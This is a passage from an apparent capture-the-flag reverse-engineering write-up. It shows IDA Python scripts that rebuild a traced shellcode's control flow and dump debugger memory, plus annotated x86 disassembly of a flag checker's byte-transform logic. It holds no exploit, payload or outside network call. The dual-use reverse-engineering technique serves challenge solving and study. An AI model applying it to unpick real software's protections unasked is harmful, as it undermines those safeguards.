ida_bytes.get_bytes(seg_start, seg_end - seg_start) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">    codes_hex = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(ASMCODE_PATH, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            s = line.strip()</span><br><span class="line">            <span class="keyword">if</span> s: codes_hex.append(s)</span><br><span class="line">    os.makedirs(os.path.dirname(OUT_TRACEASM), exist_ok=<span class="literal">True</span>)</span><br><span class="line">    cursor = PC_START_EA</span><br><span class="line">    alt_cursor = <span class="literal">None</span></span><br><span class="line">    call_stack = []</span><br><span class="line">    last_occ = &#123;&#125;</span><br><span class="line">    restart_guard = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(OUT_TRACEASM, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(codes_hex):</span><br><span class="line">            <span class="comment"># print(i)</span></span><br><span class="line">            <span class="keyword">if</span> restart_guard &gt; <span class="number">20000</span>:</span><br><span class="line">                out.write(<span class="string">&quot;[fatal] too many restarts, stop.\n&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            hx = codes_hex[i]</span><br><span class="line">            bs = hex_to_bytes(hx)</span><br><span class="line">            pat = bytes_to_patstr(bs)</span><br><span class="line">            blen = <span class="built_in">len</span>(bs)</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">try_match_from</span>(<span class="params">pos: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">                here = read_bytes(pos, blen)</span><br><span class="line">                <span class="keyword">if</span> here == bs: <span class="keyword">return</span> pos</span><br><span class="line">                win_end = <span class="built_in">min</span>(pos + WINDOW, seg_end)</span><br><span class="line">                <span class="keyword">return</span> find_in_range(pos, win_end, bs)</span><br><span class="line">            ea = try_match_from(cursor)</span><br><span class="line">            <span class="keyword">if</span> ea == idc.BADADDR <span class="keyword">and</span> alt_cursor <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                ea2 = try_match_from(alt_cursor)</span><br><span class="line">                <span class="keyword">if</span> ea2 != idc.BADADDR:</span><br><span class="line">                    cursor = alt_cursor</span><br><span class="line">                    alt_cursor = <span class="literal">None</span></span><br><span class="line">                    ea = ea2</span><br><span class="line">            <span class="keyword">if</span> ea == idc.BADADDR:</span><br><span class="line">                <span class="keyword">if</span> hx <span class="keyword">in</span> last_occ: ea = last_occ[hx]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ea3 = find_in_range(PC_START_EA, seg_end, bs)</span><br><span class="line">                    <span class="keyword">if</span> ea3 == idc.BADADDR:</span><br><span class="line">                        cursor = PC_START_EA</span><br><span class="line">                        alt_cursor = <span class="literal">None</span></span><br><span class="line">                        call_stack.clear()</span><br><span class="line">                        last_occ.clear()</span><br><span class="line">                        i = <span class="number">0</span></span><br><span class="line">                        restart_guard += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    ea = ea3</span><br><span class="line">            last_occ[hx] = ea</span><br><span class="line">            ida_bytes.del_items(ea, ida_bytes.DELIT_SIMPLE, <span class="number">16</span>)</span><br><span class="line">            idc.create_insn(ea)</span><br><span class="line">            dis = idc.generate_disasm_line(ea, <span class="number">0</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            ilen, mnem = decode_len_and_mnem(ea, blen)</span><br><span class="line">            out.write(<span class="string">f&quot;<span class="subst">&#123;i:06d&#125;</span>\t0x<span class="subst">&#123;ea:08X&#125;</span>\t<span class="subst">&#123;hx&#125;</span>\t<span class="subst">&#123;dis&#125;</span>\n&quot;</span>)</span><br><span class="line">            next_fall = ea + ilen</span><br><span class="line">            alt_cursor = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> is_call(mnem):</span><br><span class="line">                ret_addr = ea + ilen</span><br><span class="line">                tgt = op_target(ea)</span><br><span class="line">                call_stack.append(ret_addr)</span><br><span class="line">                <span class="keyword">if</span> seg_start &lt;= tgt &lt; seg_end: cursor = tgt</span><br><span class="line">                <span class="keyword">else</span>: cursor = ret_addr</span><br><span class="line">            <span class="keyword">elif</span> is_ret(mnem):</span><br><span class="line">                <span class="keyword">if</span> call_stack: cursor = call_stack.pop()</span><br><span class="line">                <span class="keyword">else</span>: cursor = next_fall</span><br><span class="line">            <span class="keyword">elif</span> is_jmp(mnem):</span><br><span class="line">                tgt = op_target(ea)</span><br><span class="line">                <span class="keyword">if</span> seg_start &lt;= tgt &lt; seg_end: cursor = tgt</span><br><span class="line">                <span class="keyword">else</span>: cursor = next_fall</span><br><span class="line">            <span class="keyword">elif</span> is_cond_jump_or_loop(mnem):</span><br><span class="line">                tgt = op_target(ea)</span><br><span class="line">                cursor = next_fall</span><br><span class="line">                <span class="keyword">if</span> seg_start &lt;= tgt &lt; seg_end: alt_cursor = tgt</span><br><span class="line">            <span class="keyword">else</span>: cursor = next_fall</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[ok] wrote -&gt; <span class="subst">&#123;OUT_TRACEASM&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[info] pc_seg=0x<span class="subst">&#123;seg_start:08X&#125;</span>-0x<span class="subst">&#123;seg_end:08X&#125;</span>, start=0x<span class="subst">&#123;PC_START_EA:08X&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>Through the assembly code, it was found that shellcode uses [ebp-0x10] to [ebp-0x4] as temporary registers, add to dump:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_dump_once</span>(<span class="params">tid=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">global</span> g_fp, g_last_dump16, g_dump_count</span><br><span class="line">    <span class="keyword">if</span> MAX_DUMPS <span class="keyword">and</span> g_dump_count &gt;= MAX_DUMPS: <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">try</span>: p = ida_dbg.get_reg_val(<span class="string">&quot;EBX&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] get_reg_val(EBX) failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> p <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> p &lt; <span class="number">0x10000</span>: <span class="keyword">return</span></span><br><span class="line">    data = dbg_read_mem(p, READ_SIZE)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] failed to read <span class="subst">&#123;READ_SIZE&#125;</span> bytes @ EBX=0x<span class="subst">&#123;p:08X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; READ_SIZE: data += <span class="string">b&quot;\x00&quot;</span> * (READ_SIZE - <span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">if</span> DEDUP_CONSECUTIVE <span class="keyword">and</span> g_last_dump16 == data: <span class="keyword">return</span></span><br><span class="line">    out = data + (<span class="string">b&quot;\x00&quot;</span> * PAD_SIZE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        g_fp.write(out)</span><br><span class="line">        g_fp.flush()</span><br><span class="line">        g_last_dump16 = data</span><br><span class="line">        g_dump_count += <span class="number">1</span></span><br><span class="line">        ebp_arr = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): ebp_arr[i] = read_dword_from_target(<span class="number">0x19F354</span>+<span class="number">4</span>*i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] #<span class="subst">&#123;g_dump_count&#125;</span> hit 0x<span class="subst">&#123;BREAK_EA:08X&#125;</span> | EBX=0x<span class="subst">&#123;p:08X&#125;</span> | [EBP-0x10~EBP-0x4] = &quot;</span>+<span class="string">&quot; &quot;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;v:08X&#125;</span>&quot;</span> <span class="keyword">for</span> v <span class="keyword">in</span> ebp_arr))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[dump] file write error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>From the trace output, the 4 dwords are: <code>sum_diff</code>, <code>block_state</code>, <code>byte_processed</code> and <code>state_tag</code>. The <code>block_res</code> is initialized with 0xCAFEBABE, and updated every byte. When the number of processed byte reaches 4 (19 for the last one), the <code>block_state</code> will xor with the index of 5 dwords which load by <code>40A000</code>, and the result will or to <code>sum_diff</code>. Hardware breakpoint shows that the input will be load at <code>movzx   eax, byte ptr [ecx+eax]</code>, and the run amount of this instruction is just 19. And in the loop, [ebp+8] is the <code>block_state</code>, [ebp-4] is the input byte. Analyze the first part:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0040A0AA</span>      <span class="keyword">movzx</span> <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="built_in">eax</span>] <span class="comment">; inp[0]</span></span><br><span class="line"><span class="number">0x0040A0AE</span>      <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0040A0AF</span>      <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A0B2</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>-<span class="number">14h</span>]</span><br><span class="line"><span class="number">0x0040A0B5</span>      <span class="keyword">call</span> <span class="number">0x40A1CE</span></span><br><span class="line"><span class="number">0x0040A1CE</span>      <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="number">0x0040A1CF</span>      <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="number">0x0040A1D1</span>      <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">14h</span></span><br><span class="line"><span class="number">0x0040A1D4</span>      <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line"><span class="number">0x0040A1D5</span>      <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line"><span class="number">0x0040A1D6</span>      <span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line"><span class="number">0x0040A1D7</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>], <span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x0040A1DA</span>      <span class="keyword">movzx</span> <span class="built_in">eax</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]</span><br><span class="line"><span class="number">0x0040A1DE</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="built_in">eax</span></span><br><span class="line"><span class="comment">; jmp 0x0040A1E9</span></span><br><span class="line"><span class="number">0x0040A1E9</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line"><span class="number">0x0040A1EC</span>      <span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">1</span> <span class="comment">; and block_state, 1</span></span><br><span class="line"><span class="comment">; if block_state &amp; 1 == 0 &#123;</span></span><br><span class="line">    <span class="number">0x0040A1F5</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">40h</span> <span class="comment">; num|let</span></span><br><span class="line">	<span class="comment">; if inp &lt; 0x40 (num) &#123;&#123;</span></span><br><span class="line">        <span class="number">0x0040A1FB</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="number">0x0040A1FD</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">6Ch</span> <span class="comment">; &#x27;l&#x27;</span></span><br><span class="line">        <span class="number">0x0040A203</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line">        <span class="number">0x0040A206</span>      <span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">2</span> <span class="comment">; and inp, 2</span></span><br><span class="line">		<span class="comment">; if inp &amp; 2 == 0 &#123;&#123;&#123;</span></span><br><span class="line">            <span class="number">0x0040A231</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line">            <span class="number">0x0040A234</span>      <span class="keyword">shl</span> <span class="built_in">eax</span>, <span class="number">4</span></span><br><span class="line">            <span class="number">0x0040A237</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">            <span class="number">0x0040A23A</span>      <span class="keyword">sub</span> <span class="built_in">ecx</span>, <span class="built_in">eax</span></span><br><span class="line">            <span class="number">0x0040A23C</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">ecx</span></span><br><span class="line">            <span class="number">0x0040A23F</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">30h</span> <span class="comment">; &#x27;0&#x27;</span></span><br><span class="line">			<span class="comment">; if inp == 0x30 &#123;&#123;&#123;&#123;</span></span><br><span class="line">                <span class="number">0x0040A245</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">                <span class="number">0x0040A247</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">79h</span> <span class="comment">; &#x27;y&#x27;</span></span><br><span class="line">                <span class="number">0x0040A24D</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">                <span class="number">0x0040A250</span>      <span class="keyword">or</span> <span class="built_in">eax</span>, <span class="number">0F0F0F0F0h</span></span><br><span class="line">                <span class="number">0x0040A255</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">				<span class="comment">; &#125;&#125;&#125;&#125; else (inp != 0x30) &#123;&#123;&#123;&#123; (do nothing) &#125;&#125;&#125;&#125;.</span></span><br><span class="line">			<span class="comment">; &#125;&#125;&#125; else (inp &amp; 2 == 2) &#123;&#123;&#123;</span></span><br><span class="line">                <span class="number">0x0040A20B</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">                <span class="number">0x0040A20D</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line">                <span class="number">0x0040A213</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">                <span class="number">0x0040A216</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="number">55AA55AAh</span></span><br><span class="line">                <span class="number">0x0040A21B</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">                <span class="number">0x0040A21E</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">                <span class="number">0x0040A221</span>      <span class="keyword">add</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line">                <span class="number">0x0040A224</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">            <span class="comment">; &#125;&#125;&#125;.</span></span><br><span class="line">    <span class="comment">; &#125;&#125; else (inp &gt;= 0x40) (not num) &#123;&#123;</span></span><br><span class="line">        <span class="number">0x0040A203</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line">        <span class="number">0x0040A25D</span>      <span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line">        <span class="number">0x0040A25F</span>      <span class="keyword">push</span> <span class="number">2</span></span><br><span class="line">        <span class="number">0x0040A261</span>      <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line">        <span class="number">0x0040A262</span>      <span class="keyword">div</span> <span class="built_in">ecx</span></span><br><span class="line">        <span class="number">0x0040A264</span>      <span class="keyword">test</span> <span class="built_in">edx</span>, <span class="built_in">edx</span></span><br><span class="line">        <span class="comment">; if inp % 2 == 0 &#123;&#123;&#123;</span></span><br><span class="line">            <span class="number">0x0040A26F</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">            <span class="number">0x0040A272</span>      <span class="keyword">shl</span> <span class="built_in">eax</span>, <span class="number">3</span></span><br><span class="line">            <span class="number">0x0040A275</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">            <span class="number">0x0040A278</span>      <span class="keyword">shr</span> <span class="built_in">ecx</span>, <span class="number">1Dh</span></span><br><span class="line">            <span class="number">0x0040A27B</span>      <span class="keyword">or</span> <span class="built_in">eax</span>, <span class="built_in">ecx</span></span><br><span class="line">            <span class="number">0x0040A27D</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">            <span class="number">0x0040A280</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">            <span class="number">0x0040A283</span>      <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="number">12345678h</span></span><br><span class="line">        <span class="comment">; &#125;&#125;&#125; else (inp % 2 == 1) &#123;&#123;&#123;</span></span><br><span class="line">            <span class="number">0x0040A295</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">            <span class="number">0x0040A298</span>      <span class="keyword">shr</span> <span class="built_in">eax</span>, <span class="number">5</span></span><br><span class="line">            <span class="number">0x0040A29B</span>      <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">            <span class="number">0x0040A29E</span>      <span class="keyword">shl</span> <span class="built_in">ecx</span>, <span class="number">1Bh</span></span><br><span class="line">            <span class="number">0x0040A2A1</span>      <span class="keyword">or</span> <span class="built_in">eax</span>, <span class="built_in">ecx</span></span><br><span class="line">            <span class="number">0x0040A2A3</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">            <span class="number">0x0040A2A6</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">            <span class="number">0x0040A2A9</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="number">87654321h</span></span><br><span class="line">        <span class="comment">; &#125;&#125;&#125;.</span></span><br><span class="line">    	<span class="number">0x0040A288</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">    <span class="comment">; &#125;&#125;.</span></span><br><span class="line"><span class="comment">; &#125; else (state &amp; 1 == 1) &#123;</span></span><br><span class="line">    <span class="number">0x0040A2BE</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="number">0x0040A2C1</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line">    <span class="number">0x0040A2C4</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">80000000h</span></span><br><span class="line">    <span class="comment">; if state &amp; 0x80000000 == 0x80000000 &#123;&#123;</span></span><br><span class="line">        <span class="number">0x0040A2D3</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">        <span class="number">0x0040A2D6</span>      <span class="keyword">sub</span> <span class="built_in">eax</span>, <span class="number">21524111h</span></span><br><span class="line">        <span class="number">0x0040A2DB</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">        <span class="number">0x0040A2DE</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">60h</span> <span class="comment">; &#x27;`&#x27;</span></span><br><span class="line">        <span class="comment">; if inp &lt; 0x60 &#123;&#123;&#123; do nothing &#125;&#125;&#125; else (inp &gt;= 0x60) &#123;&#123;&#123;</span></span><br><span class="line">            <span class="number">0x0040A2EB</span>      <span class="keyword">imul</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">21h</span> <span class="comment">; &#x27;!&#x27;</span></span><br><span class="line">            <span class="number">0x0040A2EF</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">            <span class="number">0x0040A2F2</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">        <span class="comment">; &#125;&#125;&#125;.</span></span><br><span class="line">    <span class="comment">; &#125;&#125; else (state ^ inp &amp; 0x80000000 == 0) &#123;&#123;</span></span><br><span class="line">        <span class="number">0x0040A107</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="number">0x0040A2F9</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">9Dh</span></span><br><span class="line">        <span class="number">0x0040A301</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">61h</span> <span class="comment">; &#x27;a&#x27;</span></span><br><span class="line">		<span class="comment">; if inp &lt; &#x27;a&#x27; &#123;&#123;&#123;</span></span><br><span class="line">			<span class="number">0x0040A318</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">41h</span> <span class="comment">; &#x27;A&#x27;</span></span><br><span class="line">			<span class="comment">; if inp &gt;= &#x27;A&#x27; &#123;&#123;&#123;&#123;</span></span><br><span class="line">				<span class="number">0x0040A31E</span>      <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>], <span class="number">5Ah</span> <span class="comment">; &#x27;Z&#x27;</span></span><br><span class="line">				<span class="comment">; if inp &lt;= &#x27;Z&#x27; &#123;&#123;&#123;&#123;&#123;</span></span><br><span class="line">                    <span class="number">0x0040A324</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line">                    <span class="number">0x0040A329</span>      <span class="keyword">inc</span> <span class="built_in">eax</span></span><br><span class="line">                    <span class="number">0x0040A32D</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">                    <span class="number">0x0040A330</span>      <span class="keyword">add</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>-<span class="number">4</span>]</span><br><span class="line">                    <span class="number">0x0040A333</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">                    <span class="number">0x0040A336</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">                    <span class="number">0x0040A339</span>      <span class="keyword">and</span> <span class="built_in">eax</span>, <span class="number">100h</span></span><br><span class="line">					<span class="comment">; if state &amp; 0x100 == 0 &#123;&#123;&#123;&#123;&#123;&#123; (do nothing) &#125;&#125;&#125;&#125;&#125;&#125; else (state &amp; 0x100 == 0x100) &#123;&#123;&#123;&#123;&#123;&#123;</span></span><br><span class="line">						<span class="number">0x0040A340</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">                        <span class="number">0x0040A342</span>      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line">                        <span class="number">0x0040A348</span>      <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">8</span>]</span><br><span class="line">                        <span class="number">0x0040A34B</span>      <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="number">13371337h</span></span><br><span class="line">                        <span class="number">0x0040A350</span>      <span class="keyword">mov</span> [<span class="built_in">ebp</span>+<span class="number">8</span>], <span class="built_in">eax</span></span><br><span class="line">                    <span class="comment">; &#125;&#125;&#125;&#125;&#125;&#125;.</span></span><br><span class="line">				<span class="comment">; 